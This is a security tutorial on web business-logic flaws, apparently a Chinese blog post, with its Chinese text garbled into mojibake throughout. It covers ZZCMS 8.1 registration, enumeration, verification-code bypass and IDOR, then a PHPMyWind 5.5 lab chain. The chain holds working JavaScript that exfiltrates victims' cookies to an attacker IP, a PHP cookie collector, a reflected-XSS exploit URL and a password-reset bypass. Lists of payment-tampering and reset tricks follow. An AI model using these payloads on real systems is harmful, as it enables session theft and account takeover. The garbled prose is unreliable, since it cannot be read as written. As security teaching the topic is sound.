è½½å¡æ­» éŸ³ä¹ å”±æ­Œç±»è½¯ä»¶ä¿®æ”¹ä¸Šä¼ åˆ†æ•°ç­‰å‚æ•° ä»˜è´¹ä¸‹è½½å°è¯•æ›¿æ¢ä¸‹è½½ID ä¿®æ”¹ä»˜è´¹ä¸‹è½½é‡‘é¢ F12æŸ¥çœ‹ä¸‹æ˜¯å¦æœ‰æ­Œæ›²åœ°å€ ç½‘çº¦è½¦ æ— é™å«è½¦ï¼Œé‡å¤å‘é€åè®®é€ æˆå¸‚åœºæ··ä¹± ä¿®æ”¹è¯„ä»·åˆ†æ•° ä¿®æ”¹é™æ—¶ä¼˜æƒ å«è½¦å…³é”®å‚æ•° æ›¿æ¢ä¼˜æƒ å· è¶Šæƒæ“ä½œå…¶ä»–è®¢å• ä¸šåŠ¡é€»è¾‘æ¼æ´éœ€è¦å¯¹ä¸šåŠ¡ç†Ÿæ‚‰ï¼Œæœ‰å¾ˆå¼ºçš„é€»è¾‘æ€ç»´èƒ½åŠ›ï¼Œæ‰€ä»¥ä¸‹é¢ä¸»è¦æè¿°ä¸€ä¸‹ZZCMS8.1ä¸­æ³¨å†Œã€ç™»å½•å’Œå¯†ç æ‰¾å›å‡ºç°çš„æ¼æ´é€»è¾‘ï¼Œå†å°½é‡å¤šå’Œå…¨çš„æ”¶é›†æ•´ç†ç›¸å…³åœºæ™¯ã€‚ é€»è¾‘æ¼æ´åˆ©ç”¨å®ä¾‹ ZZCMS 8.1 æ‰¹é‡æ³¨å†Œ æˆ‘ä»¬æŠŠæ³¨å†ŒåŠŸèƒ½å¡«å†™ç›¸å…³ä¿¡æ¯ï¼Œç„¶åæŠ“åŒ…ï¼š å°†æ•°æ®åŒ…å‘é€åˆ°repeaterï¼Œæ¯æ¬¡ä¿®æ”¹usernameå€¼ï¼Œå‘ç°ï¼Œåªéœ€è¦ä¿®æ”¹usernameå€¼å°±å¯ä»¥æ³¨å†ŒæˆåŠŸç”¨æˆ·ï¼Œå›¾å½¢éªŒè¯ç æ— æ•ˆï¼Œå¹¶ä¸”æœªå¯¹ç”µè¯ï¼Œé‚®ç®±ç­‰ä¿¡æ¯æ ¡éªŒï¼Œå¯æ‰¹é‡æ³¨å†Œã€‚ æ‰¹é‡çŒœè§£ç”¨æˆ· åŒæ ·æ˜¯æ³¨å†ŒåŠŸèƒ½ï¼Œåœ¨è¾“å…¥ç”¨æˆ·åæ—¶ï¼Œå‘ç°ä¼šæç¤ºç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼ŒçŒœæµ‹è¯¥ä½ç½®å¯ä»¥çŒœæµ‹å“ªäº›ç”¨æˆ·æ³¨å†Œè¿‡è¯¥ç½‘ç«™ã€‚ æŠ“å–è¯¥ä½ç½®æ•°æ®åŒ…å‘ç°ï¼Œä¼šå¯¹ç”¨æˆ·åidè¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯å¦å­˜åœ¨ï¼Œæ˜¯å¦ç¬¦åˆè§„åˆ™ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ‰¹é‡æ¢æµ‹ç”¨æˆ·ï¼Œå‘ç°å¯ä»¥æ‰¹é‡æ¢æµ‹å·²æ³¨å†Œè¿‡çš„ç”¨æˆ·ï¼š ä»»æ„å¯†ç é‡ç½® åœ¨å¿˜è®°å¯†ç åŠŸèƒ½ï¼Œæˆ‘ä»¬è¾“å…¥ç”¨æˆ·åæ­£ç¡®åä¼šè¿›è¡ŒçŸ­ä¿¡éªŒè¯ç ï¼Œé€šè¿‡æ‰‹æœºéªŒè¯ç æˆ–è€…é‚®ç®±éªŒè¯ç ã€‚ åœ¨éªŒè¯ç åŠŸèƒ½ä¸­è¾“å…¥éªŒè¯ç è¿›è¡ŒéªŒè¯ï¼Œå‘ç°å…¶ä¸­æœ‰ä¸€æ®µJavaScriptä»£ç document.userreg.yzm_mobile2.value=='no'æ˜¯ç”¨æ¥éªŒè¯éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°ç›´æ¥æ”¹å˜è¿™ä¸ªå€¼å°±å¯ä»¥ç»•è¿‡éªŒè¯ç ï¼š å¹³è¡Œè¶Šæƒ è¶Šæƒåˆå¯åˆ†ä¸ºå¹³è¡Œè¶Šæƒï¼ˆç›¸åŒç”¨æˆ·ï¼‰ã€å‚ç›´è¶Šæƒï¼ˆä½æƒé™ç”¨æˆ·å’Œé«˜æƒé™ç”¨æˆ·ï¼‰ã€æœªæˆæƒè®¿é—®ï¼ˆæ— éœ€ç”¨æˆ·ç›´æ¥æ“ä½œï¼‰ã€‚ ç™»å½•æ™®é€šç”¨æˆ·test2,æŸ¥çœ‹ç”¨æˆ·æ•æ„Ÿçš„é¡µé¢ï¼š å‘é€åˆ°repteateræ•°æ®åŒ…ä¸­ï¼Œçœ‹åˆ°cookieä¸­å­˜åœ¨usernameå‚æ•°ï¼Œä¿®æ”¹ä¸ºå·²å­˜åœ¨çš„ç”¨æˆ·åï¼Œå‘ç°è¿”å›åŒ…ä¸­å¯æŸ¥çœ‹å…¶ä»–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€‚ PHPMyWind 5.5 ç”±äºç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°PHPMyWind5.5çš„æºç ï¼Œåªèƒ½çœ‹çœ‹å…¶ä»–å¸ˆå‚…åˆ†æçš„æ–‡ç« ï¼Œè¿™é‡Œå°±å†å¤§æ¦‚å¤è¿°ä¸€éã€‚ é¦–å…ˆå¯¹å®éªŒç¯å¢ƒåšä¸€ä¸ªç®€å•è¯´æ˜ï¼š æœåŠ¡å™¨ 192.168.114.159 éƒ¨ç½²æœ‰â€œPHPMyWind 5.5â€ æ”»å‡»æœºï¼ˆsafedogï¼‰ 192.168.114.1 éƒ¨ç½²æœ‰èƒ½â€œæ”¶é›†PHPMyWindç”¨æˆ·çš„Cookieâ€çš„PHPè„šæœ¬ã€JSè„šæœ¬ å—å®³è€…ï¼ˆvictimï¼‰ 192.168.114.161 å¯é€šè¿‡æµè§ˆå™¨è®¿é—®â€œæœåŠ¡å™¨â€ä¸Šçš„â€œPHPMyWindâ€ç½‘ç«™ è¿‡ç¨‹1ä»£è¡¨æ”»å‡»è€…safedogé€šè¿‡é‚®ä»¶ç­‰æ–¹å¼å‘é€æ¶æ„é“¾æ¥ï¼ˆåµŒæœ‰å¯ç›—å–å¹¶å‘é€Cookieçš„JSè„šæœ¬ï¼‰ç»™å—å®³è€…victimï¼› è¿‡ç¨‹2ä»£è¡¨åœ¨å—å®³è€…victimå—è¯±å¯¼ç‚¹å‡»æ¶æ„é“¾æ¥åï¼Œä¼šç»ç”±æµè§ˆå™¨å°†æ”»å‡»è€…safedogåµŒå…¥çš„JSè„šæœ¬å½“åšæ•°æ®å‘é€ç»™æœåŠ¡å™¨ä¸Šçš„PHPMyWindç½‘ç«™çš„åå°„å‹XSSæ¼æ´ç‚¹ï¼› è¿‡ç¨‹3ä¸è¿‡ç¨‹4ä»£è¡¨PHPMyWindç½‘ç«™åœ¨å—åˆ°åå°„å‹XSSæ”»å‡»åï¼Œä¼šæ‰§è¡ŒJSè„šæœ¬ï¼Œå°†å—å®³è€…victimçš„Cookieè¿”å›ç»™å—å®³è€…victimï¼Œå¹¶å‘é€ç»™æ”»å‡»è€…safedogã€‚ è¿‡ç¨‹5ä»£è¡¨æ”»å‡»è€…safedogåœ¨è·å¾—å—å®³è€…victimçš„Cookieåï¼Œåˆ©ç”¨å—å®³è€…victimçš„Cookieä¸PHPMyWindç½‘ç«™çš„é€»è¾‘æ¼æ´ç‚¹è¿›è¡Œå¯†ç é‡ç½®æ”»å‡»ã€‚ åå°„å‹XSS æ”»å‡»è€…æ­å»ºå¯æ¥æ”¶å—å®³è€…Cookieçš„PHPç½‘ç«™ï¼› è¯¥PHPç½‘ç«™ç”±â€œReflectiveXSS.jsâ€â€œReflectiveXSS.phpâ€å’Œâ€œcookie.txtâ€è¿™3ä¸ªæ–‡ä»¶æ„æˆã€‚ å…¶ä¸­â€œReflectiveXSS.jsâ€ç”¨äºé’ˆå¯¹æœåŠ¡å™¨ç«¯PHPMyWindç½‘ç«™çš„åå°„å‹XSSæ¼æ´çªƒå–å—å®³è€…victimçš„Cookieï¼Œå¹¶å°†è¯¥Cookieå€¼ä¼ è¾“ç»™ReflectiveXSS.phpï¼›â€œReflectiveXSS.phpâ€ç”¨äºæ¥æ”¶åä¸ºâ€œvictimcookieâ€çš„GETè¯·æ±‚ï¼Œå¹¶å°†â€œvictimcookieâ€çš„å‚æ•°å€¼ä¿å­˜åˆ°â€œcookie.txtâ€ã€‚ ReflectiveXSS.jsçš„ä»£ç å¦‚ä¸‹ï¼š 12345678//é€šè¿‡æŒ‡å®šçš„åç§°&#x27;img&#x27;åˆ›å»ºimgå…ƒç´ var img = document.createElement(&#x27;img&#x27;);img.width = 0;img.height = 0;//å°†imgå…ƒç´ çš„srcå±æ€§æŒ‡å‘è„šæœ¬æ–‡ä»¶ReflectiveXSS.php//å°†cookieä¿¡æ¯çš„å­—ç¬¦ä¸²ä½œä¸ºURIç»„ä»¶è¿›è¡Œç¼–ç ï¼Œç„¶åç”¨victimcookieå‚æ•°ä¼ é€’img.src = &#x27;http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie=&#x27;+encodeURIComponent(document.cookie); ReflectiveXSS.phpçš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213&lt;?php @ini_set(&#x27;display_errors&#x27;,1); $str = $_GET[&#x27;victimcookie&#x27;]; $filePath = &quot;cookie.txt&quot;; if(is_writable($filePath)==false)&#123; echo &quot;can&#x27;t write&quot;; &#125;else&#123; $handler = fopen($filePath, &#x27;a&#x27;); fwrite($handler, $str); fclose($handler); &#125;?&gt; å‡ºå‘XSSæ¼æ´çš„EXPï¼š 1http:&#x2F;&#x2F;192.168.114.159&#x2F;phpmywind5-5&#x2F;data&#x2F;api&#x2F;oauth&#x2F;connect.php?method&#x3D;unknownmethod&lt;script src&#x3D;http:&#x2F;&#x2F;192.168.114.1&#x2F;safedog-attack&#x2F;ReflectiveXSS.js&gt;&lt;&#x2F;script&gt; å‡ºç°XSSæ¼æ´çš„åœ°æ–¹ï¼š è¯¥æ¼æ´å‡ºç°çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š/data/api/oauth/connect.phpï¼Œå…¶ä¸­çš„ä»£ç æ®µï¼š 1234if(method_exists($connect, $method)) $connect-&gt;method();else echo &quot;è¯·æ±‚çš„æ–¹æ³•[&quot; . $method . &quot;ä¸å­˜åœ¨&quot;; ifåˆ¤æ–­çš„ä½œç”¨æ˜¯â€œåˆ¤æ–­å‡½æ•°åæ˜¯å¦å­˜åœ¨â€ï¼Œä»£ç çš„é€»è¾‘æ˜¯â€œå¦‚æœå‡½æ•°åä¸å­˜åœ¨ï¼Œåˆ™åœ¨PHPé¡µé¢è¾“å‡ºå‡½æ•°åâ€ï¼Œè¿™ä¸€åšæ³•ä¼šé€ æˆåå°„å‹XSSæ¼æ´ã€‚ ä»»æ„å¯†ç é‡ç½® è¯¥æ¼æ´å‡ºç°çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š/member.php 123456789101112131415161718192021222324//æ£€æµ‹æ—§å¯†ç æ˜¯å¦æ­£ç¡®if($password != &#x27;&#x27;)&#123; $oldpassword = md5(md5($oldpassword)); $r = $dosql-&gt;GetOne(&quot;SELECT `password` FROM `#@__member` WHERE `username`=&#x27;$c_uname&#x27;&quot;); if($r[&#x27;password&#x27;] != $oldpassword) &#123; ShowMsg(msg: &#x27;æŠ±æ­‰ï¼Œæ—§å¯†ç é”™è¯¯ï¼&#x27;, gourl: &#x27;-1&#x27;); exit(); &#125;&#125;$sql = &quot;UPDATE `#@__member` SET&quot;;if($password != &#x27;&#x27;)&#123; $password = md5(md5($password)); $sql .= &quot;password=&#x27;$password&#x27;,&quot;;&#125;@$sql .= &quot;question=&#x27;$question&#x27;, answer=&#x27;$answer&#x27;, cnname=&#x27;$cnname&#x27;, enname=&#x27;$enname&#x27;, sex=&#x27;$sex&#x27;, birthtype=&#x27;$birthtype&#x27;, birth_year=&#x27;$birth_year&#x27;, birth_month=&#x27;$birth_month&#x27;, birth_day=&#x27;$birth_day&#x27;, astro=&#x27;$astro&#x27;, bloodtype=&#x27;$bloodtype&#x27;, trade=&#x27;$trade&#x27;, live_prov=&#x27;$live_prov&#x27;, live_city=&#x27;$live_city&#x27;, live_country=&#x27;$live_country&#x27;, home_prov=&#x27;$home_prov&#x27;, home_city=&#x27;$home_city&#x27;, home_country=&#x27;$home_country&#x27;, cardtype=&#x27;$cardtype&#x27;, cardnum=&#x27;$cardnum&#x27;, intro=&#x27;$intro&#x27;, email=&#x27;$email&#x27;, qqnum=&#x27;$qqnum&#x27;, mobile=&#x27;$mobile&#x27;, telephone=&#x27;$telephone&#x27;, address_prov=&#x27;$address_prov&#x27;, address_city=&#x27;$address_city&#x27;, address_country=&#x27;$address_country&#x27;, address=&#x27;$address&#x27;, zipcode=&#x27;$zipcode&#x27; WHERE id=&#x27;$id&#x27; AND `username`=&#x27;$c_uname&#x27;&quot;;if($dosql-&gt;ExecNoneQuery($sql))&#123; ShowMsg(msg: &#x27;èµ„æ–™æ›´æ–°æˆåŠŸ&#x27;, gourl: &#x27;?c=edit&#x27;); exit();&#125; ç¬¬ä¸€ä¸ªifåˆ¤æ–­çš„ä½œç”¨æ˜¯â€œåˆ¤æ–­ç”¨æˆ·æäº¤çš„æ–°å¯†ç æ˜¯å¦ä¸ºç©ºâ€ï¼Œåœ¨ç”¨æˆ·æäº¤çš„æ–°å¯†ç ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šè¿›è¡Œâ€˜æ—§å¯†ç çš„æ¯”å¯¹â€™ï¼Œå¦‚æœæäº¤çš„æ—§å¯†ç å’Œæ•°æ®åº“çš„æŸ¥è¯¢ç»“æœä¸ä¸€è‡´ï¼Œåˆ™ä¸å…è®¸ç»§ç»­è¿›è¡Œæ›´æ¢å¯†ç çš„æ“ä½œã€‚ç¬¬äºŒä¸ªifåˆ¤æ–­çš„ä½œç”¨ä»ä¸ºâ€œåˆ¤æ–­ç”¨æˆ·æäº¤çš„æ–°å¯†ç æ˜¯å¦ä¸ºç©ºâ€ï¼Œåœ¨ç”¨æˆ·æäº¤çš„æ–°å¯†ç ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå¯¹æ–°å¯†ç è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œéšåè¿›è¡ŒSQLè¯­å¥çš„æ‹¼æ¥ã€‚è¿™ä¸¤ä¸ªifè¯­å¥å­˜åœ¨äº†é€»è¾‘æ¼æ´ã€‚å› ä¸ºï¼Œå¦‚æœæˆ‘ä»¬æäº¤çš„æ–°å¯†ç ï¼ˆpasswordå˜é‡å’Œrepasswordå˜é‡ï¼‰ä¸ºç©ºï¼Œåˆ™å¯ä»¥ç»•è¿‡å¯¹æ—§å¯†ç ï¼ˆoldpasswordå˜é‡ï¼‰çš„éªŒè¯ã€‚ åœ¨è¿™é‡Œä¹‹æ‰€ä»¥è¦ä½¿ç”¨XSSè·å–cookieï¼Œæ˜¯å› ä¸ºå½“SQLè¯­å¥æ»¡è¶³æ¡ä»¶id='$id' AND username ='$c_uname';æ—¶ï¼Œæ‰å¯è¿›è¡Œupdateæ“ä½œã€‚å˜é‡c_unameå€¼ï¼ˆæ˜æ–‡ï¼‰æ¥æºäºAuthCode($_COOKIE['username'])ï¼Œå³å…ˆå–å¾—Cookieä¸­username(å¯†æ–‡)çš„å€¼ï¼Œç„¶åé€šè¿‡AuthCodeå‡½æ•°é…åˆé…ç½®æ–‡ä»¶ä¸­çš„å¯†é’¥æ¥è·å–æ˜æ–‡ã€‚ PHPMyWindé‡‡ç”¨Cookieä¿å­˜æ··æ·†åŒ–çš„ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€‚å› ä¸ºé…ç½®æ–‡ä»¶ä¸­çš„å¯†é’¥æ˜¯åœ¨CMSæ­å»ºæ—¶éšæœºç”Ÿæˆçš„ï¼Œç®—æ³•ä¹Ÿä¸å¯é€†ï¼Œå› æ­¤è¦åœ¨çŸ¥é“c_nameå˜é‡çš„å‰æä¸‹ï¼Œä»æ­£å‘ä¼ªé€ usernameç­‰å˜é‡ï¼Œä»¥é€šè¿‡æƒé™éªŒè¯å…·æœ‰è¾ƒå¤§éš¾åº¦ã€‚ä¸ºè·å–Cookieä¸­çš„usernameç­‰å€¼ï¼Œå¯è€ƒè™‘å€ŸåŠ©åå°„å‹XSSæ¼æ´ã€‚ å…¶ä»–å®ä¾‹ ç°åœ¨wooyunå·²ç»æ²¡äº†ï¼Œåªèƒ½åœ¨ä¸€äº›é•œåƒç½‘ç«™çœ‹æ¼æ´åˆé›†ï¼Œä»¥é€»è¾‘æ¼æ´ä¸ºå…³é”®è¯æœç´¢åˆ°äº†186ä¸ªç›¸å…³æ¼æ´ï¼ŒåŸºæœ¬ä¸ŠæŠŠæ¯ä¸ªæ¼æ´éƒ½è¿‡äº†ä¸€éï¼Œä¹Ÿæ²¡åŠæ³•å¤ç°ï¼Œè®°å½•ä¸€äº›æ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„æ¡ˆä¾‹ï¼Œæƒå½“æœé›†æ€è·¯å§ã€‚ æ”¯ä»˜ä¸šåŠ¡ç›¸å…³é€»è¾‘æ¼æ´ å¸¸è§æ‰‹æ³• ä¿®æ”¹é‡‘é¢ï¼› ä¿®æ”¹å•†å“æ•°é‡ï¼› ä¿®æ”¹ä¼˜æƒ é‡‘é¢ï¼› ä¿®æ”¹æ•°é‡ã€å•ä»·ï¼Œä¼˜æƒ ä»·æ ¼å‚æ•°ä¸ºè´Ÿæ•°ã€å°æ•°ï¼Œæ— é™å¤§ï¼› å•†å“ä»·æ ¼æ›´æ”¹ï¼› æ”¯ä»˜keyæ³„éœ²ç­‰ã€‚ å®é™…å®‰å…¨ä¸­ä¼šæœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ï¼Œåæ­£å„ç§èƒ½æ”¹çš„å‚æ•°éƒ½å»å°è¯•ã€‚ä¸ªæ•°å•ä»·-ä¼˜æƒ åˆ¸ä¸ªæ•°å•ä»·=æ€»é¢ï¼Œæ¯ä¸ªå€¼éƒ½å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œå°±çœ‹æœåŠ¡è‡ªèº«å¤„ç†æ˜¯å¦æœ‰é—®é¢˜äº†ã€‚ é¡ºä¸°å®ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼šæ•°é‡å’Œé‡‘é¢æ²¡æœ‰åšç­¾å ç§»åŠ¨æ‰‹æœºæ”¯ä»˜ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼šçˆ†ç ´å››ä½éªŒè¯ç  æ–°ä¸œæ–¹é€»è¾‘æ”¯ä»˜æ¼æ´ï¼šä¿®æ”¹è¿è´¹é‡‘é¢ä¸ºè´Ÿæ•°ï¼Œä½¿å¾—è¯¾ç¨‹é‡‘é¢+è¿è´¹å¤§äº0å³å¯ ä¸­å›½é›¶é£Ÿç½‘æ”¯ä»˜é€»è¾‘æ¼æ´ï¼šåŒä¸Š é˜¿é‡Œäº‘è®¡ç®—æŒ‰é‡ä»˜è´¹é€»è¾‘æ¼æ´ä¸€æšï¼ˆä½ä»·äº«å—è¶…çº§ä¸»æœºï¼‰ï¼šç»è¿‡base64ç¼–ç çš„æ•°æ®å¯ä»¥è¢«ç¯¡æ”¹ï¼Œå¹¶ä¸”åç«¯ä¼šæ¥å—ç¯¡æ”¹çš„æ•°æ® ä¹è§†å•†åŸæ”¯ä»˜é€»è¾‘æ¼æ´ï¼ˆä»·æ ¼å¯æ›´æ”¹ï¼‰ï¼šä»·æ ¼å‚æ•°æ˜æ–‡æ˜¾ç¤ºåœ¨urlï¼Œå¯ä»¥ç›´æ¥æ›´æ”¹ å†æ¬¡æŒ–æ˜ä¹è§†å•†åŸæ”¯ä»˜é€»è¾‘æ¼æ´ï¼šåŒä¸Š è¯»è§ˆå¤©ä¸‹æ”¯ä»˜é€»è¾‘æ¼æ´å¯åˆ·å……å€¼é‡‘é¢ï¼šæ›¿æ¢æ”¯ä»˜è®¢å•å· ç›Šç›Ÿçˆ±ç‚’è‚¡å•†åŸæ”¯ä»˜é€»è¾‘æ¼æ´ï¼šä¿®æ”¹Cookieä¸­çš„å‚æ•°å€¼ é¥¿äº†ä¹ˆé€»è¾‘æ¼æ´ä¹‹å…è´¹åƒå–ä¸æ˜¯æ¢¦ï¼šæ‰‹æœºå·+;+æ‰‹æœºå·ç»•è¿‡æœåŠ¡å™¨å¯¹æ‰‹æœºå·ç çš„æ¬¡æ•°é™åˆ¶ ä¸ƒå¤•å•èº«ä¸“åœºä¹‹æ€§å¤šå¤šå…è´¹åˆ·æˆäººç”¨å“(æ”¯ä»˜é€»è¾‘æ¼æ´)ï¼šæ”¹è´Ÿæ•°åˆ·ä»£å¸ å¤§ç–†æŸå¤„æ”¯ä»˜é€»è¾‘æ¼æ´å¯1å…ƒä¹°æ— äººæœºï¼šhttpsæ”¹ä¸ºhttpè®¿é—®ï¼Œä¿®æ”¹æ”¯ä»˜çš„å‚æ•° å¯†ç æ‰¾å›ç›¸å…³é€»è¾‘æ¼æ´ å¸¸è§æ‰‹æ³• æ‰¾å›å¯†ç çš„éªŒè¯ç ä¸ºå››ä½æ•°å­—å¯çˆ†ç ´çœŸå®éªŒè¯ç ï¼› é‡‡ç”¨æœ¬åœ°éªŒè¯,å¯ä»¥å…ˆå°è¯•ä¿®æ”¹è‡ªå·±çš„å¸å·å¯†ç ï¼Œä¿å­˜æ­£ç¡®çš„è¿”å›åŒ…ï¼Œç„¶åä¿®æ”¹ä»–äººå¯†ç çš„æ—¶å€™æ›¿æ¢è¿”å›åŒ…ï¼› æœ€ç»ˆä¿®æ”¹å¯†ç çš„æ•°æ®åŒ…ï¼Œä»¥å¦å¤–çš„IDä½œä¸ºèº«ä»½åˆ¤æ–­ï¼ˆä¾‹å¦‚useridï¼‰ï¼Œè€Œè¯¥IDåœ¨åˆ«å¤„å¯ä»¥è·å–åˆ°ï¼› æ¥å—éªŒè¯ç çš„æ‰‹æœºå·ä¿®æ”¹ä¸ºè‡ªå·±çš„å·ç ï¼Œç„¶åè¾“å…¥è‡ªå·±çš„å·ç æ¥æ”¶åˆ°çš„éªŒè¯ç å»è¿›è¡Œå¯†ç é‡ç½®ï¼› è·å–éªŒè¯ç çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸€ä¸ªèº«ä»½æ ‡è¯†ï¼ˆä¾‹å¦‚cookieå€¼ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ›¿æ¢ä»–äººè´¦å·çš„èº«ä»½è¯é‡ç½®ä»–äººçš„å¯†ç ï¼› å…·ä½“å¯ä»¥å»iæ˜¥ç§‹çœ‹carry_yourå‘è¿‡çš„ä¸€ç¯‡ä¸“é—¨é’ˆå¯¹å¯†ç é‡ç½®çš„è§†é¢‘ã€‚ ç”¨æˆ·å‡­è¯æš´åŠ›ç ´è§£ å››ä½æˆ–è€…å…­ä½çš„çº¯æ•°å­— WooYun: å½“å½“ç½‘ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´ WooYun: å¾®ä¿¡ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´ è¿”å›å‡­è¯ urlè¿”å›éªŒè¯ç åŠtoken WooYun: èµ°ç§€ç½‘ç§€å›¢ä»»æ„å¯†ç ä¿®æ”¹ç¼ºé™· WooYun: å¤©å¤©ç½‘ä»»æ„è´¦æˆ·å¯†ç é‡ç½®ï¼ˆäºŒï¼‰ å¯†ç æ‰¾å›å‡­è¯åœ¨é¡µé¢ä¸­ é€šè¿‡å¯†ä¿é—®é¢˜æ‰¾å›å¯†ç  WooYun: sohué‚®ç®±ä»»æ„ç”¨æˆ·å¯†ç é‡ç½® è¿”å›çŸ­ä¿¡éªŒè¯ç  WooYun: æ–°æµªæŸç«™ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹ï¼ˆéªŒè¯ç ä¸å–å›é€»è¾‘è®¾è®¡ä¸å½“ï¼‰ é‚®ç®±å¼±token æ—¶é—´æˆ³çš„md5 WooYun: å¥‡è™360ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´ ç”¨æˆ·å &amp; æœåŠ¡å™¨æ—¶é—´ WooYun: ä¸­å…´æŸç½‘ç«™ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´ï¼ˆç»å…¸è®¾è®¡ç¼ºé™·æ¡ˆä¾‹ï¼‰ ç”¨æˆ·å‡­è¯æœ‰æ•ˆæ€§ çŸ­ä¿¡éªŒè¯ç  WooYun: OPPOæ‰‹æœºé‡ç½®ä»»æ„è´¦æˆ·å¯†ç ï¼ˆ3ï¼‰ WooYun: ç¬¬äºŒæ¬¡é‡ç½®OPPOæ‰‹æœºå®˜ç½‘ä»»æ„è´¦æˆ·å¯†ç ï¼ˆç§’æ”¹ï¼‰ WooYun: OPPOä¿®æ”¹ä»»æ„å¸å·å¯†ç  é‚®ç®±token WooYun: èº«ä»½é€šä»»æ„å¯†ç ä¿®æ”¹-æ³„æ¼å¤§é‡å…¬æ°‘ä¿¡æ¯ é‡ç½®å¯†ç token WooYun: é­…æ—çš„è´¦å·ç³»ç»Ÿå†…å­˜åœ¨æ¼æ´å¯å¯¼è‡´ä»»æ„è´¦æˆ·çš„å¯†ç é‡ç½® é‡æ–°ç»‘å®š WooYun: ç½‘æ˜“é‚®ç®±å¯ç›´æ¥ä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç  WooYun: å¦‚å®¶é…’åº—æŸä¸¥é‡é€»è¾‘æ¼æ´å¯ç™»é™†ä»»æ„è´¦å·å¯å¯¼è‡´å‡ åƒä¸‡æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆæ¶‰åŠä»»æ„ç”¨æˆ·è´¦å·ä¸ªäººåŸºæœ¬ä¿¡æ¯ã€å…¥ä½è®°å½•ç­‰ï¼‰ Wooyun: åä½é…’åº—å®˜ç½‘æŸä¸¥é‡é€»è¾‘æ¼æ´å¯ç™»é™†ä»»æ„è´¦å·ï¼ˆæ¶‰åŠä»»æ„ç”¨æˆ·è´¦å·ä¸ªäººåŸºæœ¬ä¿¡æ¯ã€å…¥ä½è®°å½•ç­‰ï¼‰ WooYun: 12308å¯ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç  é‚®ç®±ç»‘å®š WooYun: æŸå½©ç¥¨è®¾è®¡ç¼ºé™·å¯ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç  WooYun: ä¸­å›½å·¥æ§ç½‘ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´ æœåŠ¡å™¨éªŒè¯ WooYun: æºç¨‹æ—…è¡Œç½‘ä»»æ„è€æ¿å¯†ç ä¿®æ”¹(åº†åœ¨wooyunç¬¬100æ´) æœåŠ¡å™¨éªŒè¯å¯æ§å†…å®¹ WooYun: AAæ‹¼è½¦ç½‘ä¹‹ä»»æ„å¯†ç æ‰¾å›2 WooYun: å››å·æˆ‘è¦å»å“ª517æ—…è¡Œç½‘é‡ç½®ä»»æ„è´¦å·å¯†ç æ¼æ´ æœåŠ¡å™¨éªŒè¯éªŒè¯é€»è¾‘ä¸ºç©º WooYun: æŸæ”¿ä¼ä½¿ç”¨é‚®ä»¶ç³»ç»Ÿç–‘ä¼¼å­˜åœ¨é€šç”¨è®¾è®¡é—®é¢˜ ç”¨æˆ·èº«ä»½éªŒè¯ è´¦å·ä¸æ‰‹æœºå·ç çš„ç»‘å®š WooYun: ä¸Šæµ·ç”µä¿¡é€šè¡Œè¯ä»»æ„å¯†ç é‡ç½® è´¦å·ä¸é‚®ç®±è´¦å·çš„ç»‘å®š WooYun: é­…æ—çš„è´¦å·ç³»ç»Ÿå†…å­˜åœ¨æ¼æ´å¯å¯¼è‡´ä»»æ„è´¦æˆ·çš„å¯†ç é‡ç½® WooYun: å’Œè®¯ç½‘ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç æ¼æ´ æ‰¾å›æ­¥éª¤ è·³è¿‡éªŒè¯æ­¥éª¤ã€æ‰¾å›æ–¹å¼ï¼Œç›´æ¥åˆ°è®¾ç½®æ–°å¯†ç é¡µé¢ WooYun: OPPOæ‰‹æœºåŒæ­¥å¯†ç éšæ„ä¿®æ”¹ï¼ŒçŸ­ä¿¡é€šè®¯å½•éšæ„æŸ¥çœ‹ WooYun: ä¸­å›½ç”µä¿¡æŸIDCæœºæˆ¿ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿè®¾è®¡ç¼ºé™·è‡´ä½¿ç³»ç»Ÿæ²¦é™· æœ¬åœ°éªŒè¯ åœ¨æœ¬åœ°éªŒè¯æœåŠ¡å™¨çš„è¿”å›ä¿¡æ¯ï¼Œç¡®å®šæ˜¯å¦æ‰§è¡Œé‡ç½®å¯†ç ï¼Œä½†æ˜¯å…¶è¿”å›ä¿¡æ¯æ˜¯å¯æ§çš„å†…å®¹ï¼Œæˆ–è€…å¯ä»¥å¾—åˆ°çš„å†…å®¹ WooYun: çœ‹æˆ‘å¦‚ä½•é‡ç½®ä¹å³°ç½‘ä¾›åº”å•†ç®¡ç†ç³»ç»Ÿä»»æ„ç”¨æˆ·å¯†ç ï¼ˆç®¡ç†å‘˜å·²è¢«é‡ç½®ï¼‰ WooYun: 